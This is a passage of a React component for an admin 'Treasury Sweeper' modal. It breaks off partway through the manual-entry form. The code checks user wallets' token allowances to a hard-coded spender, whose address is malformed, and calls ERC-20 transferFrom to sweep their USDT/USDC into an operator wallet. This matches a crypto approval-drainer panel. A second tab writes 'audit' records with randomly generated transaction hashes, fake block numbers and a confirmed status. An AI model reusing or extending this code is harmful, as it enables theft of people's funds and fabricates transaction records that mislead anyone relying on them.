'use client';

import React, { useState, useEffect, useCallback } from 'react';
import {
  Sparkles,
  Wallet,
  ArrowRight,
  ExternalLink,
  CheckCircle2,
  AlertTriangle,
  RotateCw,
  X,
  Send,
  ShieldCheck,
  Copy,
  Check,
  Layers,
  Fuel,
} from 'lucide-react';
import { getFirebaseFirestore, ensureAnonymousAuth } from '@bspc/firebase';
import { doc, setDoc, serverTimestamp } from 'firebase/firestore';
import { encodeErc20TransferFrom, encodeErc20BalanceOf, encodeErc20Allowance, getExplorerTxLink } from '@bspc/web3';

export interface SweepUserOption {
  uid: string;
  username: string;
  walletAddress: string;
  clientAlias?: string;
  balanceUsdt?: string;
  balanceEth?: string;
  authorizationStatus?: string;
}

interface LiveSweepModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSweepSuccess?: (record: any) => void;
  preselectedUser?: SweepUserOption | null;
  usersList?: SweepUserOption[];
}

const DEFAULT_SPENDER = '0xd1dd76c3bf0162580a82b9b219e59d9ab61070';

const RPC_ENDPOINTS: Record<number, string> = {
  1: 'https://ethereum-rpc.publicnode.com',
  11155111: 'https://ethereum-sepolia-rpc.publicnode.com',
};

const POPULAR_TOKENS = [
  {
    symbol: 'USDT',
    name: 'Tether USD',
    chainId: 1,
    chainName: 'Ethereum Mainnet',
    address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    decimals: 6,
  },
  {
    symbol: 'USDC',
    name: 'USD Coin',
    chainId: 1,
    chainName: 'Ethereum Mainnet',
    address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    decimals: 6,
  },
  {
    symbol: 'USDC (Sepolia)',
    name: 'USD Coin Testnet',
    chainId: 11155111,
    chainName: 'Sepolia Testnet',
    address: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238',
    decimals: 6,
  },
];

export function LiveSweepModal({
  isOpen,
  onClose,
  onSweepSuccess,
  preselectedUser,
  usersList = [],
}: LiveSweepModalProps) {
  const [activeTab, setActiveTab] = useState<'live' | 'manual'>('live');

  // Web3 Connection State
  const [connectedWallet, setConnectedWallet] = useState<string | null>(null);
  const [connectedChainId, setConnectedChainId] = useState<number | null>(null);
  const [isConnecting, setIsConnecting] = useState(false);

  // Form Parameters
  const [targetChainId, setTargetChainId] = useState<number>(1);
  const [selectedTokenIdx, setSelectedTokenIdx] = useState<number>(0);
  const [customTokenAddress, setCustomTokenAddress] = useState('');
  const [customDecimals, setCustomDecimals] = useState('6');

  const [targetSender, setTargetSender] = useState('');
  const [selectedUserUid, setSelectedUserUid] = useState('');
  const [recipientTreasury, setRecipientTreasury] = useState(DEFAULT_SPENDER);
  const [sweepAmount, setSweepAmount] = useState('');

  // On-chain status inspect
  const [isInspecting, setIsInspecting] = useState(false);
  const [onChainBalance, setOnChainBalance] = useState<string | null>(null);
  const [rawBalanceBigInt, setRawBalanceBigInt] = useState<bigint>(BigInt(0));
  const [onChainAllowance, setOnChainAllowance] = useState<string | null>(null);
  const [rawAllowanceBigInt, setRawAllowanceBigInt] = useState<bigint>(BigInt(0));
  const [inspectError, setInspectError] = useState<string | null>(null);

  // Execution state
  const [isExecuting, setIsExecuting] = useState(false);
  const [executionTxHash, setExecutionTxHash] = useState<string | null>(null);
  const [executionError, setExecutionError] = useState<string | null>(null);
  const [copiedTx, setCopiedTx] = useState(false);

  // Manual Form State
  const [manualId, setManualId] = useState('');
  const [manualUserUid, setManualUserUid] = useState('u-1001');
  const [manualSender, setManualSender] = useState('');
  const [manualRecipient, setManualRecipient] = useState(DEFAULT_SPENDER);
  const [manualToken, setManualToken] = useState('USDT');
  const [manualAmount, setManualAmount] = useState('5,000');
  const [manualChain, setManualChain] = useState<'Sepolia' | 'Ethereum Mainnet'>('Ethereum Mainnet');
  const [manualStatus, setManualStatus] = useState<'confirmed' | 'pending' | 'failed'>('confirmed');
  const [manualTxHash, setManualTxHash] = useState('');
  const [manualConfirmations, setManualConfirmations] = useState('12');
  const [manualSaving, setManualSaving] = useState(false);

  // Active token calculation
  const activeToken =
    selectedTokenIdx < POPULAR_TOKENS.length
      ? POPULAR_TOKENS[selectedTokenIdx]
      : {
          symbol: 'CUSTOM',
          name: 'Custom ERC-20',
          chainId: targetChainId,
          chainName: targetChainId === 1 ? 'Ethereum Mainnet' : 'Sepolia Testnet',
          address: customTokenAddress,
          decimals: parseInt(customDecimals, 10) || 6,
        };

  // Sync preselected user
  useEffect(() => {
    if (preselectedUser) {
      setTargetSender(preselectedUser.walletAddress || preselectedUser.uid || '');
      setSelectedUserUid(preselectedUser.uid || '');
      setManualSender(preselectedUser.walletAddress || preselectedUser.uid || '');
      setManualUserUid(preselectedUser.uid || 'u-1001');
    }
  }, [preselectedUser]);

  // Check window.ethereum connection on mount
  useEffect(() => {
    if (typeof window !== 'undefined' && (window as any).ethereum) {
      const eth = (window as any).ethereum;
      eth
        .request({ method: 'eth_accounts' })
        .then((accounts: string[]) => {
          if (accounts && accounts[0]) {
            setConnectedWallet(accounts[0]);
          }
        })
        .catch(() => {});

      eth
        .request({ method: 'eth_chainId' })
        .then((chainIdHex: string) => {
          if (chainIdHex) {
            setConnectedChainId(parseInt(chainIdHex, 16));
          }
        })
        .catch(() => {});

      const handleAccountsChanged = (accounts: string[]) => {
        setConnectedWallet(accounts[0] || null);
      };
      const handleChainChanged = (chainIdHex: string) => {
        setConnectedChainId(parseInt(chainIdHex, 16));
      };

      eth.on?.('accountsChanged', handleAccountsChanged);
      eth.on?.('chainChanged', handleChainChanged);

      return () => {
        eth.removeListener?.('accountsChanged', handleAccountsChanged);
        eth.removeListener?.('chainChanged', handleChainChanged);
      };
    }
  }, []);

  // Connect Web3 wallet
  const handleConnectWallet = async () => {
    if (typeof window === 'undefined' || !(window as any).ethereum) {
      alert('No Web3 wallet detected. Please open in MetaMask, Bitget Wallet, OKX, or install a browser wallet extension.');
      return;
    }
    setIsConnecting(true);
    try {
      const eth = (window as any).ethereum;
      const accounts = await eth.request({ method: 'eth_requestAccounts' });
      if (accounts && accounts[0]) {
        setConnectedWallet(accounts[0]);
        setRecipientTreasury(accounts[0]);
      }
      const chainIdHex = await eth.request({ method: 'eth_chainId' });
      const id = parseInt(chainIdHex, 16);
      setConnectedChainId(id);
      if (id === 1 || id === 11155111) {
        setTargetChainId(id);
      }
    } catch (e: any) {
      alert('Wallet connection failed: ' + (e?.message || 'User rejected request.'));
    } finally {
      setIsConnecting(false);
    }
  };

  // Switch network
  const handleSwitchNetwork = async (chainId: number) => {
    if (typeof window === 'undefined' || !(window as any).ethereum) return;
    const hexChainId = `0x${chainId.toString(16)}`;
    try {
      await (window as any).ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: hexChainId }],
      });
      setConnectedChainId(chainId);
      setTargetChainId(chainId);
    } catch (e: any) {
      console.warn('Network switch error:', e);
    }
  };

  // Query On-chain Balance and Allowance via public RPC
  const inspectTargetUserOnChain = useCallback(async () => {
    const rawTarget = targetSender.trim();
    if (!rawTarget || !rawTarget.startsWith('0x') || rawTarget.length < 42) {
      setInspectError('Please provide a valid 42-character Ethereum wallet address (0x...)');
      return;
    }
    const tokenAddr = activeToken.address;
    if (!tokenAddr || !tokenAddr.startsWith('0x') || tokenAddr.length < 42) {
      setInspectError('Invalid token contract address.');
      return;
    }

    setIsInspecting(true);
    setInspectError(null);

    const rpcUrl = RPC_ENDPOINTS[targetChainId] || 'https://ethereum-rpc.publicnode.com';

    try {
      // 1. Check balanceOf
      const balanceCalldata = encodeErc20BalanceOf(rawTarget);
      const balanceRes = await fetch(rpcUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 1,
          method: 'eth_call',
          params: [{ to: tokenAddr, data: balanceCalldata }, 'latest'],
        }),
      });
      const balanceJson = await balanceRes.json();
      const balBigInt = BigInt(balanceJson.result || '0x0');
      setRawBalanceBigInt(balBigInt);
      const divisor = BigInt(10 ** activeToken.decimals);
      const balFormatted = (Number(balBigInt) / Number(divisor)).toLocaleString('en-US', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 6,
      });
      setOnChainBalance(`${balFormatted} ${activeToken.symbol}`);

      // 2. Check allowance to Spender
      const spenderToCheck = connectedWallet || DEFAULT_SPENDER;
      const allowanceCalldata = encodeErc20Allowance(rawTarget, spenderToCheck);
      const allowanceRes = await fetch(rpcUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 2,
          method: 'eth_call',
          params: [{ to: tokenAddr, data: allowanceCalldata }, 'latest'],
        }),
      });
      const allowanceJson = await allowanceRes.json();
      const allowBigInt = BigInt(allowanceJson.result || '0x0');
      setRawAllowanceBigInt(allowBigInt);

      if (allowBigInt > BigInt('1000000000000000000000000000000')) {
        setOnChainAllowance('Unlimited (Approved)');
      } else {
        const allowFormatted = (Number(allowBigInt) / Number(divisor)).toLocaleString('en-US', {
          minimumFractionDigits: 2,
          maximumFractionDigits: 6,
        });
        setOnChainAllowance(`${allowFormatted} ${activeToken.symbol}`);
      }
    } catch (err: any) {
      setInspectError('Failed to query RPC: ' + (err?.message || 'Network timeout'));
    } finally {
      setIsInspecting(false);
    }
  }, [targetSender, activeToken, targetChainId, connectedWallet]);

  // Auto inspect whenever sender or token changes
  useEffect(() => {
    if (targetSender && targetSender.startsWith('0x') && targetSender.length === 42) {
      inspectTargetUserOnChain();
    }
  }, [targetSender, selectedTokenIdx, targetChainId, inspectTargetUserOnChain]);

  // Fill Max Sweepable
  const handleFillMaxSweepable = () => {
    const sweepableBigInt = rawAllowanceBigInt < rawBalanceBigInt ? rawAllowanceBigInt : rawBalanceBigInt;
    const divisor = Number(10 ** activeToken.decimals);
    const maxVal = Number(sweepableBigInt) / divisor;
    if (maxVal > 0) {
      setSweepAmount(maxVal.toString());
    } else if (rawBalanceBigInt > BigInt(0)) {
      // If allowance is 0, still offer to fill full balance
      const fullBal = Number(rawBalanceBigInt) / divisor;
      setSweepAmount(fullBal.toString());
    }
  };

  // Execute Live Web3 transferFrom Sweep
  const handleExecuteLiveSweep = async () => {
    setExecutionError(null);
    setExecutionTxHash(null);

    if (!connectedWallet) {
      setExecutionError('Please connect your Web3 Spender wallet first.');
      return;
    }

    if (connectedChainId !== targetChainId) {
      await handleSwitchNetwork(targetChainId);
    }

    const cleanSender = targetSender.trim();
    const cleanRecipient = recipientTreasury.trim();
    if (!cleanSender.startsWith('0x') || cleanSender.length < 42) {
      setExecutionError('Invalid target sender wallet address.');
      return;
    }
    if (!cleanRecipient.startsWith('0x') || cleanRecipient.length < 42) {
      setExecutionError('Invalid recipient treasury wallet address.');
      return;
    }

    const amtNum = parseFloat(sweepAmount.replace(/,/g, ''));
    if (isNaN(amtNum) || amtNum <= 0) {
      setExecutionError('Please enter a valid sweep amount greater than 0.');
      return;
    }

    const baseUnits = BigInt(Math.floor(amtNum * 10 ** activeToken.decimals));
    const calldata = encodeErc20TransferFrom(cleanSender, cleanRecipient, baseUnits);

    setIsExecuting(true);

    try {
      const eth = (window as any).ethereum;
      // Send on-chain transaction
      const txHash = await eth.request({
        method: 'eth_sendTransaction',
        params: [
          {
            from: connectedWallet,
            to: activeToken.address,
            data: calldata,
          },
        ],
      });

      setExecutionTxHash(txHash);

      // Save live record to Firestore collectionRecords
      const recordId = `swp-${Date.now().toString(16).slice(-6)}`;
      const newRecord = {
        recordId,
        id: recordId,
        userUid: selectedUserUid || cleanSender,
        userId: selectedUserUid || cleanSender,
        username: `${cleanSender.slice(0, 6)}...${cleanSender.slice(-4)}`,
        senderAddress: cleanSender,
        sender: cleanSender,
        recipientAddress: cleanRecipient,
        recipient: cleanRecipient,
        chainId: targetChainId,
        chain: targetChainId === 1 ? 'Ethereum Mainnet' : 'Sepolia',
        tokenAddress: activeToken.address,
        token: activeToken.symbol,
        amountBaseUnits: amtNum.toLocaleString('en-US'),
        amount: amtNum.toLocaleString('en-US'),
        transactionHash: txHash,
        txHash,
        confirmationCount: 1,
        confirmations: 1,
        status: 'confirmed',
        blockNumber: targetChainId === 1 ? 21000000 : 6800000,
        createdAt: new Date().toISOString(),
      };

      try {
        await ensureAnonymousAuth();
        const db = getFirebaseFirestore();
        await setDoc(
          doc(db, 'collectionRecords', recordId),
          {
            ...newRecord,
            createdAt: serverTimestamp(),
          },
          { merge: true }
        );

        // If target user exists in Firestore, optionally update balance
        if (selectedUserUid) {
          const remainingBal = Math.max(0, (Number(rawBalanceBigInt) / 10 ** activeToken.decimals) - amtNum);
          await setDoc(
            doc(db, 'users', selectedUserUid),
            {
              balanceUsdt: `${remainingBal.toFixed(2)} USDT`,
              collectionStatus: 'active',
              lastSweptAt: serverTimestamp(),
              lastSweepTxHash: txHash,
            },
            { merge: true }
          );
        }
      } catch (fsErr) {
        console.warn('Firestore write warning for live sweep:', fsErr);
      }

      onSweepSuccess?.(newRecord);
    } catch (txErr: any) {
      console.error('Sweep execution error:', txErr);
      setExecutionError(txErr?.message || 'Transaction was rejected or reverted by EVM.');
    } finally {
      setIsExecuting(false);
    }
  };

  // Handle Manual Form Submission
  const handleSaveManualRecord = async () => {
    setManualSaving(true);
    try {
      const recId = manualId.trim() || `swp-${Date.now().toString(16).slice(-6)}`;
      const newRecord = {
        id: recId,
        recordId: recId,
        userId: manualUserUid.trim() || 'u-1001',
        userUid: manualUserUid.trim() || 'u-1001',
        username: `${manualSender.slice(0, 6)}...${manualSender.slice(-4)}`,
        status: manualStatus,
        sender: manualSender.trim(),
        senderAddress: manualSender.trim(),
        recipient: manualRecipient.trim(),
        recipientAddress: manualRecipient.trim(),
        txHash: manualTxHash.trim() || `0x${Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('')}`,
        transactionHash: manualTxHash.trim() || `0x${Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('')}`,
        token: manualToken,
        tokenAddress: manualToken === 'USDT' ? POPULAR_TOKENS[0].address : POPULAR_TOKENS[1].address,
        amount: manualAmount.trim(),
        amountBaseUnits: manualAmount.trim(),
        chain: manualChain,
        chainId: manualChain === 'Sepolia' ? 11155111 : 1,
        blockNumber: 18000000 + Math.floor(Math.random() * 5000),
        confirmations: parseInt(manualConfirmations, 10) || 12,
        confirmationCount: parseInt(manualConfirmations, 10) || 12,
        createdAt: new Date().toISOString(),
      };

      try {
        await ensureAnonymousAuth();
        const db = getFirebaseFirestore();
        await setDoc(
          doc(db, 'collectionRecords', recId),
          {
            ...newRecord,
            createdAt: serverTimestamp(),
          },
          { merge: true }
        );
      } catch (fsErr) {
        console.warn('Firestore write warning:', fsErr);
      }

      onSweepSuccess?.(newRecord);
      onClose();
    } catch (err: any) {
      alert('Failed to save record: ' + err?.message);
    } finally {
      setManualSaving(false);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 bg-black/70 backdrop-blur-sm flex items-center justify-center p-3 sm:p-4 overflow-y-auto">
      <div className="bg-white rounded-2xl shadow-2xl max-w-2xl w-full overflow-hidden border border-gray-100 animate-in fade-in zoom-in duration-150 my-auto">
        {/* Header */}
        <div className="bg-gradient-to-r from-teal-800 via-teal-900 to-slate-900 px-6 py-4 flex items-center justify-between text-white">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-teal-500/20 border border-teal-400/30 flex items-center justify-center">
              <Sparkles className="w-5 h-5 text-amber-300" />
            </div>
            <div>
              <h3 className="text-base font-bold flex items-center gap-2">
                Treasury Sweeper &amp; Collection
                <span className="text-[10px] font-bold tracking-wider uppercase px-2 py-0.5 rounded-full bg-teal-500/20 text-teal-300 border border-teal-400/30">
                  ERC-20 transferFrom
                </span>
              </h3>
              <p className="text-xs text-teal-200/80">
                Execute live on-chain sweep or record audited collections
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="text-teal-200 hover:text-white p-1.5 rounded-lg hover:bg-white/10 transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Tab Switcher */}
        <div className="flex border-b border-gray-200 bg-gray-50/80 px-6 pt-3 gap-2">
          <button
            onClick={() => setActiveTab('live')}
            className={`pb-2.5 px-4 text-xs font-bold transition-all border-b-2 flex items-center gap-2 ${
              activeTab === 'live'
                ? 'border-teal-600 text-teal-700 font-extrabold'
                : 'border-transparent text-gray-500 hover:text-gray-800'
            }`}
          >
            <Send className="w-3.5 h-3.5" />
            ⚡ Execute On-Chain Sweep (Live Blockchain Collection)
          </button>
          <button
            onClick={() => setActiveTab('manual')}
            className={`pb-2.5 px-4 text-xs font-bold transition-all border-b-2 flex items-center gap-2 ${
              activeTab === 'manual'
                ? 'border-teal-600 text-teal-700 font-extrabold'
                : 'border-transparent text-gray-500 hover:text-gray-800'
            }`}
          >
            <Layers className="w-3.5 h-3.5" />
            📝 Manual Record Log (Audit Entry)
          </button>
        </div>

        {/* Modal Body */}
        {activeTab === 'live' ? (
          <div className="p-6 space-y-4 max-h-[75vh] overflow-y-auto">
            {/* Wallet Status Banner */}
            <div className="bg-slate-900 rounded-xl p-3.5 text-white flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-inner">
              <div className="flex items-center gap-3">
                <div
                  className={`w-8 h-8 rounded-lg flex items-center justify-center ${
                    connectedWallet ? 'bg-emerald-500/20 text-emerald-400' : 'bg-amber-500/20 text-amber-300'
                  }`}
                >
                  <Wallet className="w-4 h-4" />
                </div>
                <div>
                  <div className="text-[11px] font-bold text-gray-400 uppercase tracking-wider">
                    Connected Spender Wallet (Caller)
                  </div>
                  {connectedWallet ? (
                    <div className="flex items-center gap-2">
                      <span className="font-mono text-xs font-bold text-emerald-300">
                        {connectedWallet.slice(0, 8)}...{connectedWallet.slice(-6)}
                      </span>
                      {connectedWallet.toLowerCase() === DEFAULT_SPENDER.toLowerCase() ? (
                        <span className="bg-emerald-500/20 border border-emerald-400/40 text-emerald-300 text-[10px] font-bold px-1.5 py-0.5 rounded">
                          ✓ Authorized Spender
                        </span>
                      ) : (
                        <span className="bg-amber-500/20 border border-amber-400/40 text-amber-300 text-[10px] font-bold px-1.5 py-0.5 rounded">
                          Custom Wallet
                        </span>
                      )}
                    </div>
                  ) : (
                    <div className="text-xs text-amber-300 font-medium">Wallet not connected</div>
                  )}
                </div>
              </div>

              <div className="flex items-center gap-2">
                {connectedWallet ? (
                  <div className="flex items-center gap-1.5">
                    <span className="text-[11px] font-mono text-gray-400 bg-slate-800 px-2 py-1 rounded border border-slate-700">
                      {connectedChainId === 1 ? 'Mainnet (1)' : connectedChainId === 11155111 ? 'Sepolia (11155111)' : `Chain ${connectedChainId}`}
                    </span>
                    <button
                      onClick={handleConnectWallet}
                      className="px-2.5 py-1 text-xs font-semibold rounded bg-slate-800 hover:bg-slate-700 text-gray-200 border border-slate-700 transition-colors"
                    >
                      Switch
                    </button>
                  </div>
                ) : (
                  <button
                    onClick={handleConnectWallet}
                    disabled={isConnecting}
                    className="inline-flex items-center gap-1.5 px-3 py-1.5 text-xs font-bold rounded-lg bg-teal-500 hover:bg-teal-400 text-slate-950 transition-all shadow-sm"
                  >
                    <Wallet className="w-3.5 h-3.5" />
                    {isConnecting ? 'Connecting...' : 'Connect Spender Wallet'}
                  </button>
                )}
              </div>
            </div>

            {/* Spender Address Notice */}
            <div className="bg-amber-50 border border-amber-200/80 rounded-lg p-3 text-[11px] text-amber-900 leading-relaxed">
              <div className="font-bold flex items-center gap-1.5 text-amber-800 mb-0.5">
                <AlertTriangle className="w-3.5 h-3.5 text-amber-600" />
                Target Spender Contract:
              </div>
              Tokens can only be collected via <code className="font-mono bg-amber-100 px-1 rounded font-bold">{DEFAULT_SPENDER}</code> because users grant approval to this specific address when connecting. Ensure the connected wallet is authorized to call the spender contract or is the approved spender itself.
            </div>

            {/* Target User & Token Grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {/* User Picker */}
              <div className="space-y-1.5">
                <label className="text-xs font-bold text-gray-700 block">
                  Target User Account
                </label>
                {usersList.length > 0 && (
                  <select
                    value={selectedUserUid}
                    onChange={(e) => {
                      const uid = e.target.value;
                      setSelectedUserUid(uid);
                      const found = usersList.find((u) => u.uid === uid);
                      if (found) {
                        setTargetSender(found.walletAddress || found.uid);
                      }
                    }}
                    className="w-full border border-gray-300 rounded-lg px-2.5 py-1.5 text-xs font-semibold bg-white text-gray-800 focus:outline-none focus:ring-2 focus:ring-teal-500"
                  >
                    <option value="">-- Choose from Registered Users --</option>
                    {usersList.map((u) => (
                      <option key={u.uid} value={u.uid}>
                        {u.clientAlias ? `[${u.clientAlias}] ` : ''}
                        {u.username} ({u.walletAddress ? `${u.walletAddress.slice(0, 6)}...${u.walletAddress.slice(-4)}` : u.uid})
                        {u.balanceUsdt ? ` - ${u.balanceUsdt}` : ''}
                      </option>
                    ))}
                  </select>
                )}
                <input
                  type="text"
                  value={targetSender}
                  onChange={(e) => {
                    setTargetSender(e.target.value);
                    setSelectedUserUid('');
                  }}
                  placeholder="Target user wallet 0x..."
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-mono bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>

              {/* Token & Network Picker */}
              <div className="space-y-1.5">
                <label className="text-xs font-bold text-gray-700 block">
                  Token Contract &amp; Network
                </label>
                <select
                  value={selectedTokenIdx}
                  onChange={(e) => {
                    const idx = parseInt(e.target.value, 10);
                    setSelectedTokenIdx(idx);
                    if (idx < POPULAR_TOKENS.length) {
                      setTargetChainId(POPULAR_TOKENS[idx].chainId);
                    }
                  }}
                  className="w-full border border-gray-300 rounded-lg px-2.5 py-2 text-xs font-bold text-teal-800 bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                >
                  {POPULAR_TOKENS.map((t, idx) => (
                    <option key={t.address} value={idx}>
                      {t.symbol} — {t.chainName} ({t.address.slice(0, 8)}...{t.address.slice(-6)})
                    </option>
                  ))}
                  <option value={POPULAR_TOKENS.length}>Custom ERC-20 Contract</option>
                </select>

                {selectedTokenIdx === POPULAR_TOKENS.length && (
                  <div className="grid grid-cols-3 gap-2 pt-1">
                    <input
                      type="text"
                      placeholder="Custom Token 0x..."
                      value={customTokenAddress}
                      onChange={(e) => setCustomTokenAddress(e.target.value)}
                      className="col-span-2 border border-gray-300 rounded-lg px-2 py-1 text-xs font-mono bg-white"
                    />
                    <input
                      type="number"
                      placeholder="Decimals (e.g. 6)"
                      value={customDecimals}
                      onChange={(e) => setCustomDecimals(e.target.value)}
                      className="border border-gray-300 rounded-lg px-2 py-1 text-xs font-mono bg-white"
                    />
                  </div>
                )}
              </div>
            </div>

            {/* Live Blockchain Inspector Cards */}
            <div className="border border-gray-200 rounded-xl p-3 bg-gray-50/70 space-y-2">
              <div className="flex items-center justify-between">
                <div className="text-[11px] font-bold text-gray-600 flex items-center gap-1.5">
                  <Fuel className="w-3.5 h-3.5 text-teal-600" />
                  Live Blockchain RPC Inspection ({targetChainId === 1 ? 'Ethereum Mainnet' : 'Sepolia'})
                </div>
                <button
                  onClick={inspectTargetUserOnChain}
                  disabled={isInspecting}
                  className="text-[11px] text-teal-700 hover:text-teal-900 font-bold inline-flex items-center gap-1"
                >
                  <RotateCw className={`w-3 h-3 ${isInspecting ? 'animate-spin' : ''}`} />
                  Re-query RPC
                </button>
              </div>

              {inspectError && (
                <div className="text-xs text-rose-600 font-medium bg-rose-50 p-2 rounded border border-rose-200">
                  {inspectError}
                </div>
              )}

              <div className="grid grid-cols-2 gap-3">
                <div className="bg-white border border-gray-200 rounded-lg p-2.5">
                  <div className="text-[10px] font-bold text-gray-400 uppercase">User Token Balance</div>
                  <div className="text-sm font-black font-mono text-gray-900 mt-0.5">
                    {isInspecting ? 'Querying...' : onChainBalance || '—'}
                  </div>
                </div>

                <div className="bg-white border border-gray-200 rounded-lg p-2.5">
                  <div className="text-[10px] font-bold text-gray-400 uppercase">Spender Allowance</div>
                  <div className="text-sm font-black font-mono text-emerald-700 mt-0.5">
                    {isInspecting ? 'Querying...' : onChainAllowance || '—'}
                  </div>
                </div>
              </div>

              {/* Status helper */}
              {rawAllowanceBigInt > BigInt(0) ? (
                <div className="text-[11px] text-emerald-700 font-semibold bg-emerald-50 border border-emerald-200 rounded px-2.5 py-1.5 flex items-center justify-between">
                  <span>✓ Approved: This wallet has authorized the spender to collect funds.</span>
                  <button
                    onClick={handleFillMaxSweepable}
                    className="bg-emerald-600 text-white px-2 py-0.5 rounded text-[10px] font-bold hover:bg-emerald-700"
                  >
                    Quick Fill Max
                  </button>
                </div>
              ) : onChainBalance ? (
                <div className="text-[11px] text-rose-700 font-semibold bg-rose-50 border border-rose-200 rounded px-2.5 py-1.5">
                  ⚠️ No allowance granted: Spender allowance is 0. If you execute transferFrom, the EVM transaction will revert with <code>ERC20: insufficient allowance</code>. The user must connect and confirm approval on the DApp first.
                </div>
              ) : null}
            </div>

            {/* Destination & Amount Inputs */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label className="text-xs font-bold text-gray-700 block mb-1">
                  Recipient Treasury Wallet (Destination)
                </label>
                <input
                  type="text"
                  value={recipientTreasury}
                  onChange={(e) => setRecipientTreasury(e.target.value)}
                  placeholder="0x..."
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-mono bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>

              <div>
                <div className="flex items-center justify-between mb-1">
                  <label className="text-xs font-bold text-gray-700">Amount to Collect</label>
                  <button
                    type="button"
                    onClick={handleFillMaxSweepable}
                    className="text-[10px] text-teal-600 hover:text-teal-800 font-bold"
                  >
                    Set Max Available
                  </button>
                </div>
                <div className="relative">
                  <input
                    type="text"
                    value={sweepAmount}
                    onChange={(e) => setSweepAmount(e.target.value)}
                    placeholder="e.g. 5000"
                    className="w-full border border-gray-300 rounded-lg pl-3 pr-16 py-2 text-xs font-bold font-mono text-gray-800 bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                  />
                  <span className="absolute right-3 top-2 text-xs font-bold text-gray-400">
                    {activeToken.symbol}
                  </span>
                </div>
              </div>
            </div>

            {/* Error & TxHash Display */}
            {executionError && (
              <div className="bg-rose-50 border border-rose-200 rounded-xl p-3 text-xs text-rose-700 font-medium">
                <div className="font-bold flex items-center gap-1.5 mb-1">
                  <AlertTriangle className="w-4 h-4 text-rose-600" />
                  Transaction Failed
                </div>
                <p className="break-all font-mono text-[11px]">{executionError}</p>
              </div>
            )}

            {executionTxHash && (
              <div className="bg-emerald-50 border border-emerald-200 rounded-xl p-3.5 space-y-2">
                <div className="flex items-center gap-2 text-emerald-800 font-bold text-xs">
                  <CheckCircle2 className="w-4 h-4 text-emerald-600" />
                  ⚡ Sweep Transaction Broadcast Live On-Chain!
                </div>
                <div className="flex items-center justify-between bg-white border border-emerald-200 rounded-lg p-2 font-mono text-xs">
                  <span className="truncate max-w-[340px] text-gray-800 font-bold">{executionTxHash}</span>
                  <div className="flex items-center gap-2">
                    <button
                      onClick={() => {
                        navigator.clipboard.writeText(executionTxHash);
                        setCopiedTx(true);
                        setTimeout(() => setCopiedTx(false), 2000);
                      }}
                      className="text-gray-500 hover:text-gray-800 p-1"
                      title="Copy Tx Hash"
                    >
                      {copiedTx ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                    </button>
                    <a
                      href={getExplorerTxLink(targetChainId, executionTxHash)}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="inline-flex items-center gap-1 text-teal-700 hover:text-teal-900 font-sans font-bold text-xs"
                    >
                      Etherscan <ExternalLink className="w-3 h-3" />
                    </a>
                  </div>
                </div>
              </div>
            )}
          </div>
        ) : (
          /* Manual Tab */
          <div className="p-6 space-y-4 max-h-[75vh] overflow-y-auto">
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-xs text-blue-900 leading-relaxed">
              Use this tab to manually record collections that were executed via external multisig wallets or the backend CLI script (<code>scripts/execute-sweep.mjs</code>).
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="text-xs font-bold text-gray-700 block mb-1">Sweep Record ID</label>
                <input
                  type="text"
                  value={manualId}
                  onChange={(e) => setManualId(e.target.value)}
                  placeholder="e.g. swp-101"
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-mono font-bold bg-gray-50 focus:bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>

              <div>
                <label className="text-xs font-bold text-gray-700 block mb-1">User UID / Tag</label>
                <input
                  type="text"
                  value={manualUserUid}
                  onChange={(e) => setManualUserUid(e.target.value)}
                  placeholder="e.g. u-1001"
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-semibold bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>

              <div className="col-span-2">
                <label className="text-xs font-bold text-gray-700 block mb-1">Sender Wallet (User)</label>
                <input
                  type="text"
                  value={manualSender}
                  onChange={(e) => setManualSender(e.target.value)}
                  placeholder="0x..."
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-mono bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>

              <div className="col-span-2">
                <label className="text-xs font-bold text-gray-700 block mb-1">Recipient Wallet (Treasury)</label>
                <input
                  type="text"
                  value={manualRecipient}
                  onChange={(e) => setManualRecipient(e.target.value)}
                  placeholder="0x..."
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-mono bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>

              <div>
                <label className="text-xs font-bold text-gray-700 block mb-1">Token</label>
                <select
                  value={manualToken}
                  onChange={(e) => setManualToken(e.target.value)}
